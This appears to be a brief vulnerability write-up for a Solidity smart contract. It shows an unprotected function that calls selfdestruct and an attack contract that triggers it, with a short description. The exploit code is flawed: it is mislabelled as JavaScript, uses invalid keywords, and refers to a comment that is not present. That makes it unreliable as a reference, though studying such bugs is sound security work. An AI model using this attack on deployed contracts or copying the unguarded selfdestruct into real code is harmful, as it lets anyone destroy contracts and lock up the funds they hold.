## Vulnerable Code

```javascript
function BurnMe () {
    // Selfdestruct and send eth to self, 
    selfdestruct(address(this));
}
```



## Exploit Code

```javascript
Contract Attack{
    address victimAddress;
    function setVictim(address  _victim){
        victimAddress = _victim;
    }

    function startAttack(){
        victimAddress.call(byte4(keccak256(“BurnMe()”)));
    }

    function(){
        revert();
    }
}
```



##  Sophisticated Vulnerability Description
Let's look at the commant of '//Vulnerable position',the statement is not protected by any way.so if an malicious contract call the method -'BurnMe'.In this situation, the victim contract can be destruct by any macious contract easily 


